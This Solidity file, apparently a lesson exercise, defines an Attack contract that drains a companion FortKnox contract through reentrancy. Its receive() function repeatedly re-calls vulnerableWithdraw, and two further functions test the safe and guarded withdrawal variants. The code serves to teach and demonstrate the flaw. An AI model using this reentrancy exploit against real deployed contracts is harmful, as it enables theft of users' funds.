// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./day20_FortKnox.sol";

contract Attack {
    FortKnox public fortKnox;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks = 5;

    constructor(address _fortKnox) {
        fortKnox = FortKnox(_fortKnox);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function attack() external payable onlyOwner {
        require(msg.value > 0, "Need ETH to start attack");
        fortKnox.deposit{value: msg.value}();
        attackCount = 0;
        fortKnox.vulnerableWithdraw();
    }

    function attemptSafeAttack() external payable onlyOwner {
        fortKnox.deposit{value: msg.value}();
        fortKnox.safeWithdraw();
    }

    function attemptGuardedAttack() external payable onlyOwner {
        fortKnox.deposit{value: msg.value}();
        fortKnox.protectedWithdraw();
    }

    receive() external payable {
        if (attackCount < maxAttacks && address(fortKnox).balance > 0) {
            attackCount++;
            fortKnox.vulnerableWithdraw();
        }
    }

    function withdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        (bool success, ) = payable(owner).call{value: balance}("");
        require(success, "Transfer failed");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}